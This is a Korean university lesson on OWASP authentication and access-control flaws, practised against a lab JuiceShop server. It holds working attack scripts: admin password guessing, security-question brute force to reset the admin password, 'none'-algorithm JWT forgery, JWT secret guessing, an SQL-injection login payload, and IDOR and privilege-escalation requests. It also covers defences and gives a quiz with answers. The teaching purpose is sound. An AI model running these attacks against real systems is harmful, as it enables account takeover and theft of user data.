# Week 06: OWASP Top 10 (3) - 인증 및 접근 제어 취약점 (상세 버전)

## 학습 목표
- 인증(Authentication)과 인가(Authorization)의 차이를 이해한다
- 취약한 인증 메커니즘의 유형을 파악한다
- JWT 토큰 공격 기법을 실습한다
- IDOR(Insecure Direct Object Reference)과 권한 상승을 이해하고 실습한다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (이 과목에서 자주 나오는 용어)

> 대학 1~2학년이 처음 접할 수 있는 보안/IT 용어를 정리한다.
> 강의 중 모르는 용어가 나오면 이 표를 참고하라.

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **페이로드** | Payload | 공격에 사용되는 실제 데이터/코드. 예: `' OR 1=1--` | 미사일의 탄두 |
| **익스플로잇** | Exploit | 취약점을 악용하는 기법 또는 코드 | 열쇠 없이 문을 여는 방법 |
| **셸** | Shell | 운영체제와 사용자를 연결하는 명령어 해석기 (bash, sh 등) | OS에게 말 걸 수 있는 창구 |
| **리버스 셸** | Reverse Shell | 대상 서버가 공격자에게 역방향 연결을 맺는 것 | 도둑이 집에서 밖으로 전화를 거는 것 |
| **포트** | Port | 서버에서 특정 서비스를 식별하는 번호 (0~65535) | 아파트 호수 |
| **데몬** | Daemon | 백그라운드에서 실행되는 서비스 프로그램 | 24시간 근무하는 경비원 |
| **패킷** | Packet | 네트워크로 전송되는 데이터의 단위 | 택배 상자 하나 |
| **프록시** | Proxy | 클라이언트와 서버 사이에서 중개하는 서버 | 대리인, 중간 거래자 |
| **해시** | Hash | 임의 길이 데이터를 고정 길이 값으로 변환하는 함수 (SHA-256 등) | 지문 (고유하지만 원본 복원 불가) |
| **토큰** | Token | 인증 정보를 담은 문자열 (JWT, API Key 등) | 놀이공원 입장권 |
| **JWT** | JSON Web Token | Base64로 인코딩된 JSON 기반 인증 토큰 | 이름·권한이 적힌 입장권 |
| **Base64** | Base64 | 바이너리 데이터를 텍스트로 인코딩하는 방법 | 암호가 아닌 "포장" (누구나 풀 수 있음) |
| **CORS** | Cross-Origin Resource Sharing | 다른 도메인에서의 API 호출 허용 설정 | "외부인 출입 허용" 표지판 |
| **API** | Application Programming Interface | 프로그램 간 통신 규약 | 식당의 메뉴판 (주문 양식) |
| **REST** | Representational State Transfer | URL + HTTP 메서드로 자원을 조작하는 API 스타일 | 도서관 대출 시스템 (책 이름으로 검색/대출/반납) |
| **SSH** | Secure Shell | 원격 서버에 안전하게 접속하는 프로토콜 | 암호화된 전화선 |
| **sudo** | SuperUser DO | 관리자(root) 권한으로 명령 실행 | "사장님 권한으로 실행" |
| **SUID** | Set User ID | 실행 시 파일 소유자 권한으로 실행되는 특수 권한 | 다른 사람의 사원증을 빌려 출입 |
| **IPS** | Intrusion Prevention System | 네트워크 침입 방지 시스템 (악성 트래픽 차단) | 공항 보안 검색대 |
| **SIEM** | Security Information and Event Management | 보안 로그를 수집·분석하는 통합 관제 시스템 | CCTV 관제실 |
| **WAF** | Web Application Firewall | 웹 공격을 탐지·차단하는 방화벽 | 웹사이트 전용 경비원 |
| **nftables** | nftables | Linux 커널 방화벽 프레임워크 (iptables 후계) | 건물 출입구 차단기 |
| **Suricata** | Suricata | 오픈소스 IDS/IPS 엔진 | 공항 X-ray 검색기 |
| **Wazuh** | Wazuh | 오픈소스 SIEM 플랫폼 | CCTV + AI 관제 시스템 |
| **ATT&CK** | MITRE ATT&CK | 실제 공격 전술·기법을 분류한 데이터베이스 | 범죄 수법 백과사전 |
| **OWASP** | Open Web Application Security Project | 웹 보안 취약점 연구 국제 단체 | 웹 보안의 표준 기관 |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 (0~10점) | 질병 위험도 등급 |
| **CVE** | Common Vulnerabilities and Exposures | 취약점 고유 식별 번호 | 질병의 고유 코드 (예: COVID-19) |
| **OpsClaw** | OpsClaw | 보안 작업 자동화·증적 관리 플랫폼 (이 수업에서 사용) | 보안 작업 일지 + 자동화 시스템 |


---

# Week 06: OWASP Top 10 (3) - 인증 및 접근 제어 취약점

## 학습 목표

- 인증(Authentication)과 인가(Authorization)의 차이를 이해한다
- 취약한 인증 메커니즘의 유형을 파악한다
- JWT 토큰 공격 기법을 실습한다
- IDOR(Insecure Direct Object Reference)과 권한 상승을 이해하고 실습한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| opsclaw | 10.20.30.201 | 실습 기지 |
| web | 10.20.30.80 | JuiceShop:3000 |

---

## 1. 인증 vs 인가

보안에서 가장 중요한 두 가지 개념이다. 반드시 구분해야 한다.

### 인증 (Authentication) - "너는 누구인가?"

사용자의 **신원을 확인**하는 과정이다.
- ID/PW 로그인
- 지문 인식
- OTP (일회용 비밀번호)
- 인증서

### 인가 (Authorization) - "너는 무엇을 할 수 있는가?"

인증된 사용자에게 **어떤 자원에 접근할 수 있는 권한**이 있는지 확인하는 과정이다.
- 일반 사용자: 자신의 주문만 볼 수 있음
- 관리자: 모든 사용자의 주문을 볼 수 있음

**비유:**
- 인증 = 건물 입구에서 출입증 확인 (이 사람이 직원인가?)
- 인가 = 각 방의 출입 권한 확인 (이 직원이 서버실에 들어갈 수 있는가?)

---

## 2. 인증 취약점

### 2.1 기본/약한 비밀번호 (Default/Weak Passwords)

많은 시스템이 기본 비밀번호를 변경하지 않고 사용한다.

```bash
# JuiceShop에서 흔한 비밀번호로 admin 로그인 시도
for password in "admin" "admin123" "password" "123456" "admin@juice-sh.op"; do
  RESULT=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$password\"}" \
    | python3 -c "import sys,json; d=json.load(sys.stdin); print('SUCCESS' if 'authentication' in d else 'FAIL')" 2>/dev/null)
  echo "Password '$password': $RESULT"
done
```

**예상 출력:**
```
Password 'admin': FAIL
Password 'admin123': SUCCESS
Password 'password': FAIL
Password '123456': FAIL
Password 'admin@juice-sh.op': FAIL
```

> **결과**: admin의 비밀번호가 'admin123'이라는 매우 약한 비밀번호일 수 있다. (JuiceShop 버전에 따라 다를 수 있다.)

### 2.2 비밀번호 정책 부재

```bash
# 매우 약한 비밀번호로 계정 생성이 가능한지 테스트
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"weak@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"a"}' \
  | python3 -m json.tool
```

> 비밀번호 "1"로 계정이 생성되면 비밀번호 정책이 없는 것이다. 이는 심각한 보안 문제다.

### 2.3 비밀번호 찾기 기능 악용

```bash
# 보안 질문 확인
curl -s "http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op" \
  | python3 -m json.tool
```

**예상 출력:**
```json
{
    "question": {
        "question": "Your eldest siblings middle name?",
        ...
    }
}
```

> **공격 포인트**: 보안 질문의 답을 추측하거나 OSINT로 알아낼 수 있다면 비밀번호를 재설정할 수 있다.

```bash
# 비밀번호 재설정 시도 (답을 추측)
curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","answer":"Samuel","new":"hacked123","repeat":"hacked123"}' \
  | python3 -m json.tool

# 다른 답변 시도
for answer in "admin" "test" "John" "Samuel" "Jane"; do
  RESULT=$(curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$answer\",\"new\":\"Hacked123!\",\"repeat\":\"Hacked123!\"}")
  echo "Answer '$answer': $(echo $RESULT | head -c 80)"
done
```

---

## 3. 세션 관리 취약점

### 3.1 세션 고정 (Session Fixation)

공격자가 자신이 만든 세션 ID를 피해자에게 사용하게 만드는 공격:

```
1. 공격자가 세션 ID 획득: session_id=ABC123
2. 피해자에게 이 세션 ID가 포함된 링크 전송
3. 피해자가 해당 세션으로 로그인
4. 공격자가 같은 세션 ID(ABC123)로 피해자의 세션 사용
```

### 3.2 세션 예측 (Session Prediction)

세션 ID가 추측 가능한 패턴으로 생성되면 위험하다.

```bash
# 여러 번 로그인하여 토큰 패턴 분석
for i in 1 2 3; do
  TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"student@test.com","password":"Student123!"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
  echo "Token $i: ${TOKEN:0:50}..."
done
```

> JWT는 각 발급마다 다른 값을 가진다. 하지만 비밀 키가 약하면 위조가 가능하다 (아래 섹션 참조).

---

## 4. JWT 공격

### 4.1 JWT 구조 복습

```
[헤더].[페이로드].[서명]
```

```bash
# 로그인하여 JWT 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 헤더 디코딩
echo "$TOKEN" | cut -d. -f1 | python3 -c "
import sys, base64, json
data = sys.stdin.read().strip()
data += '=' * (4 - len(data) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(data)), indent=2))
"

# 페이로드 디코딩
echo "$TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
data = sys.stdin.read().strip()
data += '=' * (4 - len(data) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(data)), indent=2, ensure_ascii=False))
"
```

### 4.2 none 알고리즘 공격

JWT 표준에는 `"alg": "none"` (서명 없음)이 정의되어 있다. 서버가 이를 허용하면 서명 없이 토큰을 위조할 수 있다.

```bash
# none 알고리즘 JWT 생성
python3 << 'PYEOF'
import base64, json

# 헤더: alg를 none으로 변경
header = {"alg": "none", "typ": "JWT"}
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')

# 페이로드: admin으로 변경
payload = {
    "status": "success",
    "data": {
        "id": 1,
        "email": "admin@juice-sh.op",
        "role": "admin"
    },
    "iat": 1711526400,
    "exp": 9999999999
}
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# 서명 없음 (빈 문자열)
forged_token = f"{header_b64}.{payload_b64}."
print(f"Forged JWT: {forged_token}")
PYEOF
```

```bash
# 위조된 토큰으로 API 접근 시도
FORGED_TOKEN="위에서_생성된_토큰"
curl -s http://10.20.30.80:3000/api/Users/ \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  | python3 -m json.tool | head -10
```

> **참고**: 최신 JuiceShop은 none 알고리즘을 차단할 수 있다. 하지만 많은 실제 시스템이 이 공격에 취약하다.

### 4.3 비밀 키 브루트포스

JWT가 HS256(HMAC) 알고리즘을 사용하면, 비밀 키를 추측할 수 있다.

```bash
# 간단한 비밀 키 후보로 JWT 검증 시도
python3 << 'PYEOF'
import hmac, hashlib, base64, json

# 실제 토큰에서 헤더와 페이로드 추출
# (아래 TOKEN 변수를 실제 토큰으로 교체)
import subprocess
result = subprocess.run([
    'curl', '-s', '-X', 'POST', 'http://10.20.30.80:3000/rest/user/login',
    '-H', 'Content-Type: application/json',
    '-d', '{"email":"student@test.com","password":"Student123!"}'
], capture_output=True, text=True)

try:
    token = json.loads(result.stdout)['authentication']['token']
    parts = token.split('.')
    message = f"{parts[0]}.{parts[1]}"

    # 서명 추출
    sig = parts[2]
    sig_padded = sig + '=' * (4 - len(sig) % 4)
    actual_sig = base64.urlsafe_b64decode(sig_padded)

    # 흔한 비밀 키 목록으로 브루트포스
    common_secrets = [
        "secret", "password", "123456", "jwt_secret",
        "my_secret", "key", "admin", "test",
        "supersecret", "changeme"
    ]

    for secret in common_secrets:
        computed = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        if computed == actual_sig:
            print(f"[FOUND] Secret key: '{secret}'")
            break
    else:
        print("[INFO] Secret not found in common list (RS256 or strong key)")
        # JuiceShop은 RS256을 사용할 가능성이 높음
        header_decoded = base64.urlsafe_b64decode(parts[0] + '==')
        print(f"Algorithm: {json.loads(header_decoded).get('alg', 'unknown')}")
except Exception as e:
    print(f"Error: {e}")
PYEOF
```

---

## 5. 접근 제어 취약점

### 5.1 IDOR (Insecure Direct Object Reference)

IDOR은 URL이나 파라미터의 ID를 변경하여 **다른 사용자의 데이터에 접근**하는 공격이다.

**예시:**
```
정상 요청: GET /api/Users/22/orders  (내 주문 목록)
IDOR 공격: GET /api/Users/1/orders   (admin의 주문 목록!)
```

서버가 "이 사용자가 이 데이터에 접근할 권한이 있는가?"를 확인하지 않으면 IDOR이 성공한다.

### 5.2 실습: JuiceShop IDOR

```bash
# 먼저 일반 사용자로 로그인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 내 사용자 ID 확인
echo "$TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
data = sys.stdin.read().strip() + '=='
print(json.dumps(json.loads(base64.urlsafe_b64decode(data)), indent=2))
" 2>/dev/null

# 다른 사용자의 장바구니 조회 시도 (IDOR)
# 내 장바구니
curl -s http://10.20.30.80:3000/rest/basket/22 \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -m json.tool 2>/dev/null | head -15

# 다른 사용자(admin, id=1)의 장바구니 접근 시도
curl -s http://10.20.30.80:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -m json.tool 2>/dev/null | head -15

# 다른 사용자의 장바구니 순차적 접근
for basket_id in 1 2 3 4 5; do
  RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
    http://10.20.30.80:3000/rest/basket/$basket_id \
    -H "Authorization: Bearer $TOKEN")
  echo "Basket $basket_id: HTTP $RESULT"
done
```

### 5.3 수평적 권한 상승 (Horizontal Privilege Escalation)

같은 권한 수준의 **다른 사용자**의 데이터에 접근하는 것:

```bash
# 다른 사용자의 주문 정보 접근 시도
for user_id in 1 2 3 4 5; do
  RESULT=$(curl -s http://10.20.30.80:3000/api/Users/$user_id \
    -H "Authorization: Bearer $TOKEN" \
    -o /tmp/user_$user_id.json -w "%{http_code}")
  echo "User $user_id: HTTP $RESULT"
  if [ "$RESULT" = "200" ]; then
    python3 -c "import json; d=json.load(open('/tmp/user_$user_id.json')); print(f'  Email: {d.get(\"data\",{}).get(\"email\",\"?\")}')" 2>/dev/null
  fi
done
```

### 5.4 수직적 권한 상승 (Vertical Privilege Escalation)

일반 사용자가 **관리자 기능**에 접근하는 것:

```bash
# 일반 사용자 토큰으로 관리자 전용 API 접근 시도
echo "--- 관리자 전용 API 접근 시도 ---"

# 관리자 패널
curl -s -o /dev/null -w "Admin panel: HTTP %{http_code}\n" \
  http://10.20.30.80:3000/administration \
  -H "Authorization: Bearer $TOKEN"

# 전체 사용자 목록
curl -s -o /dev/null -w "User list: HTTP %{http_code}\n" \
  http://10.20.30.80:3000/api/Users/ \
  -H "Authorization: Bearer $TOKEN"

# 피드백 삭제 시도
curl -s -o /dev/null -w "Delete feedback: HTTP %{http_code}\n" \
  -X DELETE http://10.20.30.80:3000/api/Feedbacks/1 \
  -H "Authorization: Bearer $TOKEN"
```

### 5.5 관리자 접근 우회

JuiceShop에서는 프론트엔드에서만 관리자 페이지 접근을 제한하는 경우가 있다:

```bash
# 관리자 페이지 직접 접근 시도
# /#/administration 경로를 브라우저에서 직접 입력
curl -s "http://10.20.30.80:3000/rest/admin/application-configuration" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -m json.tool 2>/dev/null | head -20
```

---

## 6. JuiceShop 챌린지: 접근 제어

### 6.1 Challenge: View another user's basket

```bash
# Week 04에서 획득한 admin 토큰 사용
ADMIN_TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# admin 토큰으로 다른 사용자의 장바구니 열람
for i in 1 2 3 4 5; do
  echo "=== Basket $i ==="
  curl -s http://10.20.30.80:3000/rest/basket/$i \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    | python3 -m json.tool 2>/dev/null | head -10
done
```

### 6.2 Challenge: Put an additional product into another user's basket

```bash
# 다른 사용자의 장바구니에 상품 추가
curl -s -X POST http://10.20.30.80:3000/api/BasketItems/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"ProductId":1,"BasketId":1,"quantity":1}' \
  | python3 -m json.tool
```

> **분석**: BasketId를 1(admin의 장바구니)로 지정하면 내 토큰으로 admin의 장바구니에 물건을 넣을 수 있는지 확인한다.

### 6.3 Challenge: Access admin section

```bash
# 프론트엔드 JavaScript에서 admin 경로 찾기
curl -s http://10.20.30.80:3000/main.js 2>/dev/null | grep -oE 'administration|admin' | head -5

# 브라우저에서 직접 접근:
# http://10.20.30.80:3000/#/administration
echo "브라우저에서 http://10.20.30.80:3000/#/administration 에 접근하세요"
```

---

## 7. 접근 제어 방어

### 7.1 서버 측 권한 검증

**취약한 코드:**
```javascript
// URL의 ID만으로 데이터 반환 - 위험!
app.get('/api/Users/:id', (req, res) => {
  return User.findByPk(req.params.id);
});
```

**안전한 코드:**
```javascript
// 현재 로그인한 사용자의 ID와 비교
app.get('/api/Users/:id', authenticate, (req, res) => {
  if (req.user.id !== parseInt(req.params.id) && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  return User.findByPk(req.params.id);
});
```

### 7.2 RBAC (Role-Based Access Control)

역할 기반 접근 제어:

```
Admin 역할  → 모든 API 접근 가능
User 역할   → 자신의 데이터만 접근 가능
Guest 역할  → 공개 API만 접근 가능
```

### 7.3 UUID 사용

순차적 ID(1, 2, 3...) 대신 UUID를 사용하면 IDOR이 어려워진다:

```
# 추측 가능 (위험)
GET /api/Users/1
GET /api/Users/2

# 추측 불가능 (안전)
GET /api/Users/550e8400-e29b-41d4-a716-446655440000
```

> **주의**: UUID만으로는 완전한 방어가 되지 않는다. 서버 측 권한 검증이 반드시 필요하다.

---

## 8. OpsClaw로 접근 제어 테스트 자동화

```bash
# 접근 제어 테스트 프로젝트 생성
PROJECT_ID=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"week06-access-control","request_text":"JuiceShop 접근 제어 취약점 점검","master_mode":"external"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# IDOR 테스트 자동 실행
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1, "instruction_prompt":"curl -s http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op", "risk_level":"low"},
      {"order":2, "instruction_prompt":"curl -s http://10.20.30.80:3000/api/Users/ | python3 -m json.tool | head -30", "risk_level":"medium"}
    ],
    "subagent_url": "http://localhost:8002"
  }'

# 결과 확인
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/projects/$PROJECT_ID/evidence/summary \
  | python3 -m json.tool
```

---

## 9. 실습 체크리스트

- [ ] 기본/약한 비밀번호로 admin 로그인 시도
- [ ] 보안 질문 확인 및 비밀번호 재설정 시도
- [ ] JWT 토큰 디코딩 및 알고리즘 확인
- [ ] none 알고리즘 JWT 위조 시도
- [ ] IDOR로 다른 사용자의 장바구니 접근
- [ ] 일반 사용자 토큰으로 관리자 API 접근 시도
- [ ] 관리자 페이지(/#/administration) 직접 접근

---

## 과제

1. JuiceShop에서 admin의 보안 질문을 확인하고, 비밀번호 재설정을 시도하라 (성공 여부와 과정을 기록)
2. JWT none 알고리즘 공격으로 admin 토큰을 위조하고, API 접근을 시도한 결과를 보고하라
3. 일반 사용자 토큰으로 접근 가능한 관리자 API 엔드포인트를 찾아서 목록을 작성하라
4. IDOR 취약점을 방어하기 위한 방법 3가지를 코드 예시와 함께 설명하라

---

## 핵심 요약

- **인증(Authentication)**은 "누구인가?", **인가(Authorization)**는 "무엇을 할 수 있는가?"
- **약한 비밀번호**, **예측 가능한 보안 질문**은 인증 우회의 주요 원인
- **JWT 공격**: none 알고리즘, 비밀 키 브루트포스, 토큰 만료 무시
- **IDOR**: URL/파라미터의 ID를 변경하여 다른 사용자의 데이터에 접근
- **수평적 권한 상승**: 같은 레벨의 다른 사용자 데이터 접근
- **수직적 권한 상승**: 상위 권한(admin) 기능에 접근
- **방어**: 서버 측 권한 검증, RBAC, UUID 사용, 강력한 비밀번호 정책

> **다음 주 예고**: Week 07에서는 SSRF(Server-Side Request Forgery)와 파일 업로드 취약점을 다룬다. 서버를 통해 내부 네트워크에 접근하고, 파일 경로 조작으로 시스템 파일을 읽는 실습을 진행한다.


---


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** 이번 주차 "Week 06: OWASP Top 10 (3) - 인증 및 접근 제어 취약점"의 핵심 목적은 무엇인가?
- (a) 네트워크 속도 향상  (b) **공격/침투 기법/개념의 이해와 실습**  (c) 데이터베이스 관리  (d) UI 디자인

**Q2.** 이 주제에서 ATT&CK의 역할은?
- (a) 성능 최적화  (b) 비용 절감  (c) **체계적 분류와 대응 기준 제공**  (d) 사용자 편의

**Q3.** 실습에서 사용한 주요 도구/명령어의 1차 목적은?
- (a) 파일 복사  (b) **보안 취약점 수행 및 결과 확인**  (c) 메모리 관리  (d) 화면 출력

**Q4.** OpsClaw를 통해 실습을 실행하는 가장 큰 이점은?
- (a) 속도  (b) **모든 실행의 자동 증적(evidence) 기록**  (c) 무료  (d) 간편함

**Q5.** 이 주제의 보안 위험이 높은 이유는?
- (a) 비용이 많이 들어서  (b) 복잡해서  (c) **악용 시 시스템/데이터에 직접적 피해**  (d) 법적 문제

**Q6.** 방어/대응의 핵심 원칙은?
- (a) 모든 트래픽 차단  (b) **최소 권한 + 탐지 + 대응의 조합**  (c) 서버 재시작  (d) 비밀번호 변경

**Q7.** 실습 결과를 분석할 때 가장 먼저 확인해야 하는 것은?
- (a) 서버 이름  (b) **exit_code (성공/실패 여부)**  (c) 파일 크기  (d) 날짜

**Q8.** 이 주제와 관련된 MITRE ATT&CK 전술은?
- (a) Impact만  (b) Reconnaissance만  (c) **주제에 해당하는 전술(들)**  (d) 해당 없음

**Q9.** 실무에서 이 기법/도구를 사용할 때 가장 주의할 점은?
- (a) 속도  (b) **법적 허가와 범위 준수**  (c) 비용  (d) 보고서 양식

**Q10.** 다음 주차와의 연결 포인트는?
- (a) 관련 없음  (b) **이번 주 결과를 다음 주에서 활용/심화**  (c) 완전히 다른 주제  (d) 복습만

**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:b, Q10:b

---

## 과제 (다음 주까지)


## 검증 체크리스트

이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:


